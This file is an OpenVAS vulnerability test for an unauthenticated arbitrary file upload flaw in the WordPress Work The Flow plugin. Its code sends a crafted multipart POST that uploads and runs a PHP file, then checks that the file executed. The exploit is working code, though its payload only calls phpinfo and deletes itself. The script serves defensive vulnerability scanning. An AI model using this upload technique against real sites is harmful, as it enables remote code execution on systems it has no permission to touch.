###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_work_the_flow_file_upload_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Wordpress Work The Flow Plugin File Upload Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805602");
  script_version("$Revision: 11872 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-04-27 15:42:27 +0530 (Mon, 27 Apr 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Wordpress Work The Flow Plugin File Upload Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  Work The Flow File Upload Plugin and is prone to arbitrary file upload
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is is able to upload file or not.");

  script_tag(name:"insight", value:"Flaw exists because the bundled
  public/assets/jQuery-File-Upload-9.5.0/server/php/index.php script does not
  properly verify or sanitize user-uploaded files.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload arbitrary files.");

  script_tag(name:"affected", value:"Wordpress Work the flow file upload
  Plugin version 2.5.2");

  script_tag(name:"solution", value:"Upgrade to Wordpress Work the flow file
  upload Plugin version 2.5.3 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/36640");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131294");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/work-the-flow-file-upload");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/wp-content/plugins/work-the-flow-file-upload/public/"
          + "assets/jQuery-File-Upload-9.5.0/server/php/index.php";

host = http_host_name(port:http_port);

fileName = 'openvas_test' + rand();

postData = string('------------------------------7d426ec7fdf67986\r\n',
                  'Content-Disposition: form-data; name="action"\r\n\r\n',
                  'upload\r\n',
                  '------------------------------7d426ec7fdf67986\r\n',
                  'Content-Disposition: form-data; name="files"; filename="', fileName ,'.php"\r\n',
                  'Content-Type: application/octet-stream', '\r\n\r\n',
                  '<?php phpinfo(); unlink("', fileName, '.php" ); ?>\r\n\r\n',
                  '------------------------------7d426ec7fdf67986--');

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "Content-Type: multipart/form-data; boundary=----------------------------7d426ec7fdf67986\r\n",
             "\r\n", postData);

res = http_keepalive_send_recv(port:http_port, data:req);

if(res && res =~ "HTTP/1.. 200 OK")
{
  upFile = eregmatch(pattern: "(openvas_test[0-9]+.php)", string: res);
  if(!upFile[0]){
    exit(0);
  }

  url = dir + "/wp-content/plugins/work-the-flow-file-upload/public/assets"
            + "/jQuery-File-Upload-9.5.0/server/php/files/" + upFile[0];

  if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
     pattern:"phpinfo", extra_check:">System"))
  {
    if(http_vuln_check(port:http_port, url:url,
       check_header:FALSE, pattern:"HTTP/1.. 200 OK")){
      report = "\nUnable to Delete the uploaded File at " + url + "\n";
    }

    if(report){
      security_message(data:report, port:http_port);
    } else {
      security_message(port:http_port);
    }
    exit(0);
  }
}
